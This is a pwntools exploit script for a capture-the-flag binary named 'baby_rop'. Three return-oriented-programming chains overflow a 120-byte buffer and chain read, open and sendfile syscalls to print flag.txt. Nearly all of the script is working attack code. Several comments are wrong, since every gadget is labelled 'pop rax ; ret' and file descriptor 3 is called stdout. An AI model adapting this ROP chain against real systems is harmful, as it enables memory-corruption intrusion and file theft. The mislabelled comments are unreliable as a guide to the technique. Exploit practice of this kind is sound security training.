from pwn import *

context.binary = elf = ELF("./baby_rop")
p = process("./baby_rop")

pop_rax = 0x449027 # pop rax ; ret
pop_rdx_rbx = 0x47f0eb # pop rax ; ret
pop_rsi = 0x409f7e # pop rax ; ret
pop_rdi = 0x401f0f # pop rax ; ret
syscall = 0x414b16

p1 = b"A"*120
p1 += p64(pop_rax) + p64(0x0)                   # syscall_num = 0 (read)
p1 += p64(pop_rdi) + p64(0x0)                   # fd = stdin
p1 += p64(pop_rsi) + p64(0x4c63b0)              # buf = 0x4c63b0
p1 += p64(pop_rdx_rbx) + p64(0x8) + p64(0x0)    # size = 0x8, RBX is junk
p1 += p64(syscall)                              # read "flag.txt" into .bss
p1 += p64(elf.sym.vuln)                         # loop back to vuln for second round of ROP chain since our input is not long enough to squeeze everything into one

#### Part 2: Open Syscall

p2 = b"A"*120
p2 += p64(pop_rax) + p64(0x2)           # syscall num = 2 (open)
p2 += p64(pop_rdi) + p64(0x4c63b0)      # fname = 0x4c63b0
p2 += p64(pop_rsi) + p64(0x0)           # flags = 0 (open)
p2 += p64(pop_rdx_rbx) + p64(0x0) * 2   # mode = 0 (open)
p2 += p64(syscall)                      # open file and get new file descriptor for flag.txt
p2 += p64(elf.sym.vuln)                 # loop back to vuln for final rop chain

#### Part 3: Sendfile flag from flag.txt to stdout

p3 = b"A"*120
p3 += p64(pop_rax) + p64(40)            # syscall_num = 40 (sendfile)
p3 += p64(pop_rdi) + p64(1)             # out_fd = stdout (1)
p3 += p64(pop_rsi) + p64(3)             # in_fd = stdout (3)
p3 += p64(pop_rdx_rbx) + p64(0) * 2     # offset = 0
p3 += p64(syscall)                      # write flag to stdout

gdb.attach(p)
p.sendline(p1)
p.send(b"flag.txt")

p.sendline(p2)

p.sendline(p3)

p.interactive()
